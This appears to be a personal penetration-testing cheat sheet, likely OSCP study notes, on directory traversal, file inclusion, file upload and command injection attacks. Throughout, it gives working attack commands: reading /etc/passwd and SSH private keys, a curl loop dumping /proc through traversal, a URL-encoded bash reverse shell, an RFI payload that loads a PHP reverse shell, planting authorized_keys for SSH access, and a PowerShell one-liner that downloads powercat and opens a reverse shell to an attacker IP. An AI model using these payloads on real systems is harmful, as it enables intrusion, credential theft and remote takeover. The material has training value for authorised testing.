# Directory traversal

- Get username 
    
    ``` /etc/passwd ```

- Exploit directory traversals: Get ssh key

    ``` /home/{username}/.ssh/id_rsa
    vim key
    chmod 400 dt_key
     ```
    
-  Window: 
   ``` C:\Users\All Users\ssh\ssh_host_rsa_key.pub  ```

- Encoding special character
    
    e.g. . -> %2f 

- cgi-bin vuln

- Encoding not a must

# File Inclusion Vuln

- Loading a file and attach CMD

- Reverse shell & web shell
## Interesting Arguments
1. ``` powershell.exe -EncodedCommand {base64 command} ```

## Local File Inclusion LFI
### Auto smash LFI
- https://github.com/D35m0nd142/LFISuite 
### For loop get linux process by LFI
- edit the path
- ```
  for i in $(seq 0 2000); do echo -n "$i:"; curl google.com/wp-content/plugins/filter.php?url=../../../../../../../../../../../proc/$i/cmdline --output -;echo; done
  ```

- Header poison URL may differs from Log Poisoning 
- TCP reverse shell one-liner
  ``` bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 ```
1. try find useful password after /etc/passwd for opening services (you scanned!) e.g. redis have rce -> go get ``` /etc/redis/redis.conf ```
2. can use it to priv esc too! -> creating a rogue php inside the file system and load it e.g. /run/redis/test.php || CHECK ALL WRITABLE PATH!!c
3. See the source code of the web! e.g. index.php, main.py
### Interesting file path
1. Service configuration files
2. leaked db file path e.g. /var/db/mydb <- this is sqlite
3. oscp cheat sheet listed files
4. [Windows] Progra~1 = program files | Progra~2 = program files (x86)

### WAF?
1. Only Local host:
- Try adding ``` X-Forwarded-For: 127.0.0.1 ```

## RFI
- Least common (LFI > RFI)
- Host a web server for exposing exploit php 
  
  e.g. php-reverse-shell.php

  ``` python3 -m http.server 80 ```
- open reverse shell server

    ``` nc -lvnp 4444 ```
- RFI request to the website
  
  ``` ?page=http://{ip}/php-reverse-shell.php ```



# File Upload Vuln
 
## w/ Executable Files
1. Prepare a file that can run CMD
2. Reverse shell
3. file type exclusion e.g. php -> pHP
4. aspx -> mspx  


## w/o Executable Files
1. Generate SSH key: will get id_rsa and id_rsa.pub 

    ``` ssh-keygen ```

2. Edit filename of ``` id_rsa.pub ``` to ``` authorized_keys ```

3. Upload to the file to /home/{user}/.ssh OR /root/.ssh

4. Login with ssh ``` ssh emilia@ip -i -id_rsa ```

- Becareful have to remove ```.ssh/known_hosts``` in kali pc since different section computer


# OS Cmd injection

- Check which command is allow which is not, then use ``` & ``` to piggyback it


- Windows oneliner get vuln file & reverse shell
``` IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell  ```

- exploitable could be ``` ;  && ```
- remember to encode url sometimes
